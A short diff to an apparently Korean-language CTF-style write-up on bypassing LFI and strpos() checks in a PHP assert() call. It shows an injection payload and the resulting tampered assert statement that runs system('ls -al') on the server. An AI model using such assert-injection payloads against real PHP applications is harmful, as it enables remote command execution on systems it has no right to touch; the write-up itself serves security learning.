@@ -46,6 +46,8 @@ Bypass LFI checks and strpos() check in assert
 
 다른 payload로는 ```','.') === true or die(system('ls -al')) or strpos('```가 있고 이 코드를 주입하면 된다.
 
+따라서 코드가 ```assert(strpos('includes/','.') === true or die(system('ls -al')) or strpos(''.php', '..') === false) or die('Detected hacking attempt!');```가 되어 assert문이 변조가 된다.
+
 <br><br>
 <hr style="border: 2px solid;">
 <br><br>
